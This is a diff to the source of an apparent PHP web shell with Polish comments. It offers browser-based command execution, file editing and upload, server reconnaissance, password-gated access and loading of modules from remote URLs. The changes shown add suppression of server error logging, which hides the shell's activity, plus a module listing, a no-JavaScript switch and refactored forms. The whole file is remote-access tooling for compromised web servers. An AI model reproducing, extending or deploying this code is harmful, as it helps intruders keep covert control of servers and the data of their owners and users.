@@ -28,7 +28,7 @@ class Shell
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.32 b110910';
+	const VERSION = '0.40-dev b110913';
 
 	/**
 	 * Help, natywne polecenia
@@ -314,6 +314,8 @@ info - Wyświetla informacje o systemie';
 			ini_set( 'default_socket_timeout', 5 );
 			ini_set( 'date.timezone', 'Europe/Warsaw' );
 			ini_set( 'html_errors', 0 );
+			ini_set( 'log_errors', 0 );
+			ini_set( 'error_log', NULL );
 		}
 		else
 		{
@@ -446,14 +448,13 @@ info - Wyświetla informacje o systemie';
 	 */
 	private function getMenu()
 	{
-		return sprintf( 'Wersja PHP: <strong>%s</strong><br />' .
-				'SafeMode: %s<br />' .
-				'OpenBaseDir: %s<br />' .
-				'Serwer Api: <strong>%s</strong><br />' .
-				'Serwer: <strong>%s</strong><br />' .
-				'TMP: <strong>%s</strong><br />' .
-				'Zablokowane funkcje: <strong>%s</strong><br />' .
-				'Dostępne moduły: <strong><span class="green">%s</span>, %s</strong>',
+		return sprintf( 'Wersja PHP: <strong>%s</strong><br/>' .
+				'SafeMode: %s<br/>' .
+				'OpenBaseDir: %s<br/>' .
+				'Serwer Api: <strong>%s</strong><br/>' .
+				'Serwer: <strong>%s</strong><br/>' .
+				'TMP: <strong>%s</strong><br/>' .
+				'Zablokowane funkcje: <strong>%s</strong><br/>',
 
 				phpversion(),
 				$this -> getStatus( $this -> bSafeMode, TRUE ),
@@ -461,9 +462,7 @@ info - Wyświetla informacje o systemie';
 				php_sapi_name(),
 				php_uname(),
 				$this -> sTmp,
-				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'Brak' : $sDisableFunctions ),
-				implode( ', ', array_keys( $this -> aNativeModules ) ),
-				( implode( ', ', array_map( create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ), array_keys( $this -> aHelpModules ) ) ) )
+				( ( $sDisableFunctions = implode( ',', $this -> aDisableFunctions ) === '' ) ? 'Brak' : $sDisableFunctions )
 		);
 	}
 
@@ -493,6 +492,22 @@ modules - Informacje o modułach
 		modules /tmp/modules
 		modules http://example.com/modules.txt
 DATA;
+		}
+
+		/**
+		 * Lista dostepnych modulow
+		 */
+		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'loaded' ) )
+		{
+			$aModules = array_merge( array_keys( $this -> aNativeModules ),
+				array_map(
+					create_function( '$sVal', 'return strtolower( substr( $sVal, 6 ) );' ),	array_keys( $this -> aHelpModules )
+				)
+			);
+
+			sort( $aModules );
+
+			return sprintf( "Załadowano %s modułów:\r\n\t%s", count( $aModules ), implode( "\r\n\t", $aModules ) );
 		}
 
 		/**
@@ -576,7 +591,7 @@ DATA;
 			unlink( $sFilePath );
 		}
 
-		header( 'Refresh:1;url=' . Request::getCurrentUrl(), TRUE );
+		header( 'Refresh:1;url=' . Request::getCurrentUrl() );
 
 		return 'Plik z modułami został załadowany';
 	}
@@ -584,9 +599,7 @@ DATA;
 	private function getCommandCr3d1ts()
 	{
 		return <<<DATA
-Domyślnie tego polecenia nie ma, ale udało Ci się je znaleźć.
-
-Jakieś sugestie, pytania? Pisz śmiało: Krzychu - <a href="m&#97;&#x69;&#108;&#x74;&#111;:&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;">&#x6B;&#x72;&#x7A;o&#116;&#x72;&#64;&#103;&#109;&#97;&#105;&#x6C;&#46;c&#x6F;&#x6D;</a>
+Jakieś sugestie, pytania?\r\n\tPisz śmiało: Krzychu - <a href="mailto:krzotr@gmail.com">krzotr@gmail.com</a>
 DATA;
 	}
 
@@ -863,10 +876,14 @@ DATA;
 		/**
 		 * Formularz
 		 */
-		return sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
-			sprintf( '<textarea id="console" name="filedata">%s</textarea><br />', ( ( is_file( $sFile ) && is_readable( $sFile ) ) ? file_get_contents( $sFile ) : NULL ) ) .
-			sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( Request::getPost( 'cmd' ) ) ) .
-			'<input type="submit" name="submit" value="Zapisz" id="cmd-send" /></form>';
+		return sprintf( '<form action="%s" method="post">' .
+			'<textarea id="console" name="filedata">%s</textarea><br/>' .
+			'<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
+			'<input type="submit" name="submit" value="Zapisz" id="cmd-send"/></form>',
+			Request::getCurrentUrl(),
+			( ( is_file( $sFile ) && is_readable( $sFile ) ) ? file_get_contents( $sFile ) : NULL ),
+			htmlspecialchars( Request::getPost( 'cmd' ) )
+		);
 	}
 
 	/**
@@ -901,10 +918,13 @@ DATA;
 		/**
 		 * Formularz
 		 */
-		return sprintf( '<form action="%s" method="post" enctype="multipart/form-data">', Request::getCurrentUrl() ) .
-			'<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file" /></pre>' .
-			sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( Request::getPost( 'cmd' ) ) ) .
-			'<input type="submit" name="submit" value="Wrzuć" id="cmd-send" /></form>';
+		return sprintf( '<form action="%s" method="post" enctype="multipart/form-data">' .
+			'<pre id="console"><h1>Wrzuć plik</h1><input type="file" name="file"/></pre>' .
+			'<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
+			'<input type="submit" name="submit" value="Wrzuć" id="cmd-send"/></form>',
+			Request::getCurrentUrl(),
+			htmlspecialchars( Request::getPost( 'cmd' ) )
+		);
 	}
 
 	/**
@@ -1156,10 +1176,14 @@ DATA;
 		 */
 		if( ! $bOwnContent )
 		{
-			$sContent  = sprintf( '<pre id="console">%s</pre><br />', $sConsole ) .
-				     sprintf( '<form action="%s" method="post">', Request::getCurrentUrl() ) .
-				     sprintf( '<input type="text" name="cmd" value="%s" size="110" id="cmd" />', htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : (string) $sCmd ) ) ) .
-				     '<input type="submit" name="submit" value="Execute" id="cmd-send" /></form>';
+			$sContent  = sprintf( '<pre id="console">%s</pre><br/>' .
+				'<form action="%s" method="post">' .
+				'<input type="text" name="cmd" value="%s" size="110" id="cmd"/>' .
+				'<input type="submit" name="submit" value="Execute" id="cmd-send"/></form>',
+				$sConsole,
+				Request::getCurrentUrl(),
+				htmlspecialchars( ( ( ( $sVal = Request::getPost( 'cmd' ) ) !== FALSE ) ? $sVal : (string) $sCmd ) )
+			);
 		}
 
 		return $this -> getContent( $sContent );
@@ -1187,21 +1211,25 @@ DATA;
 		}
 
 		$sCurrentUrl = Request::getCurrentUrl();
-		$script = <<<DATA
+		$sScript = <<<DATA
+<script src="http://code.jquery.com/jquery-1.6.3.min.js"></script>
 <script>
 $(function()
 	{
+		$( 'div#body' ).after( '<div id="status">&nbsp;</div>' );
+		$( 'div#status' ).hide();
+
 		$( 'form' ).submit( function()
 			{
 				var sCmd = $( 'input#cmd' ).val();
 
 				if( ( $( 'input#cmd-send[value="Execute"]' ).length > 0 ) && ( sCmd.substring( 0, 5 ) != ':edit' ) && ( sCmd.substring( 0, 7 ) != ':upload' ) )
 				{
-					$( 'pre#console' ).html( '<div id="loading"><marquee behavior="alternate" direction="right" scrollamount="2">LOADING</marquee></div>' );
-
+					$( 'div#status' ).fadeIn( 250 );
 					$.post( '{$sCurrentUrl}', $( 'form' ).serialize(), function( sData )
 						{
 							$( 'pre#console' ).html( sData );
+							$( 'div#status' ).fadeOut( 250 );
 						}
 					);
 					return false;
@@ -1213,12 +1241,20 @@ $(function()
 </script>
 DATA;
 
+		/**
+		 * Wylaczenie JavaScript
+		 */
+		if( isset( $_GET['nojs']) )
+		{
+			$sScript = NULL;
+		}
+
 		$sMenu = $this -> getMenu();
 		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
 		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 		$sVersion = self::VERSION;
-return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style><script src=\"http://code.jquery.com/jquery-1.6.3.min.js\"></script></head><body>
-<div id=\"body\">\r\n{$script}\r\n" .
+return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8\"><style>{$this -> sStyleSheet}</style>{$sScript}</head><body>
+<div id=\"body\">\r\n" .
 ( $bExdendedInfo ? "<div id=\"menu\">{$sMenu}</div>\r\n" : NULL ) .
 "<div id=\"content\">{$sData}</div></div>" .
 ( $bExdendedInfo ? "<div id=\"bottom\">Wygenerowano w: <strong>{$sGeneratedIn}</strong> s | Wersja: <strong>{$sVersion}</strong></div>" : NULL ) .
@@ -1247,7 +1283,11 @@ return "<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset=\"utf-8
 				    && ( $this -> sAuth === sha1( $sUser . "\xff" . $sPass ) ) )
 				)
 				{
-					echo $this -> getContent( sprintf( '<form action="%s" method="post"><input type="text" name="user" /><input type="text" name="pass" /><input type="submit" name="submit" value="Go !" /></form>', Request::getCurrentUrl() ), FALSE );
+					echo $this -> getContent(
+							sprintf( '<form action="%s" method="post"><input type="text" name="user"/><input type="text" name="pass"/><input type="submit" name="submit" value="Go !"/></form>',
+								Request::getCurrentUrl()
+							), FALSE
+					);
 					return ;
 				}
 
